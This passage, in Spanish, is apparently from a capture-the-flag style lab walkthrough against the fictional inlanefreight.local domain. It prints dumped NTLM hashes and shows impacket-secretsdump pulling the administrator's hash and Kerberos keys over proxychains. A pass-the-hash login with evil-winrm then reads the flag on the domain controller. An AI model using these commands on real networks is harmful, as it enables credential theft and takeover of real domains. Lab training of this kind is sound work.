inlanefreight.local\njohnson:1723:aad3b435b51404eeaad3b435b51404ee:1b2a9f3b6d785e695aadfe3485a2601f:::
inlanefreight.local\mholliday:1724:aad3b435b51404eeaad3b435b51404ee:a87c92932b0ef15f6c9c39d6406c3a75:::
inlanefreight.local\mshoemaker:1725:aad3b435b51404eeaad3b435b51404ee:c15d04d9a989b3c9f1d2db979ffa325f:::
inlanefreight.local\aslater:1726:aad3b435b51404eeaad3b435b51404ee:e7d0a88542cb44ab48e5a89d864f8146:::
inlanefreight.local\kprentiss:1727:aad3b435b51404eeaad3b435b51404ee:9b12a0a33aabdbd845cd3ed5070820b9:::
inlanefreight.local\gdavis:1728:aad3b435b51404eeaad3b435b51404ee:1ab3ee9bd2e35ad25670481d9d1b4e0f:::
inlanefreight.local\jmcdaniel:1729:aad3b435b51404eeaad3b435b51404ee:1e22653293daff337f58d32695c999d0:::
inlanefreight.local\jjones:1730:aad3b435b51404eeaad3b435b51404ee:a90431144f59bc8aeecc28038d6bda40:::
inlanefreight.local\tgarcia:1731:aad3b435b51404eeaad3b435b51404ee:8a4c52fc75514ddb740971e26b9311d9:::
inlanefreight.local\mharrison:1732:aad3b435b51404eeaad3b435b51404ee:4befb46af523d5899f605eb13fa91788:::
inlanefreight.local\nhight:1733:aad3b435b51404eeaad3b435b51404ee:9dbd90a7155594a3950791b2a20b90dd:::
inlanefreight.local\wbaird:1734:aad3b435b51404eeaad3b435b51404ee:f30ba55f393d631be27cc76b385af8f9:::
inlanefreight.local\mochoa:1735:aad3b435b51404eeaad3b435b51404ee:0d2134c49735d6b979b0ee3adf520d4b:::
inlanefreight.local\jhopkins:1736:aad3b435b51404eeaad3b435b51404ee:eae13b6506b3112fee868ba26c1ade92:::
inlanefreight.local\hblea:1737:aad3b435b51404eeaad3b435b51404ee:4bfd7bb2c984e909198c2a4033d58806:::
inlanefreight.local\cpennington:1738:aad3b435b51404eeaad3b435b51404ee:4bf9a20fec430ee1044186d6648ff53b::
<------SNIP------>
```

Como vemos, esto nos vuelca el hash el usuario administrator, con el que podemos hacer un pass the hash para acceder al DC.

También nos podríamos enfocar en extraer solo los hashes del usuario administrator:

```shell-session
afsh4ck@kali$ proxychains impacket-secretsdump INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.3:445  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.3:49667  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
Administrator:aes128-cts-hmac-sha1-96:69e27df2550c5c270eca1d8ce5c46230
Administrator:des-cbc-md5:c2d9c892f2e6f2dc
```

```
User:  administrator
Hash:  27dedb1dab4d8545c6e1c66fba077da0
IP DC: 172.16.6.3
```

#### Pass the Hash para acceder al DC

```shell-session
afsh4ck@kali$ sudo proxychains evil-winrm -i 172.16.6.3 -u administrator --hash 27dedb1dab4d8545c6e1c66fba077da0
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.3:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2022   7:17 PM             19 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
r3plic4t1on_m@st3r!
```

Obtenemos la flag y hemos comprometido totalmente el Domain Controller 🏆
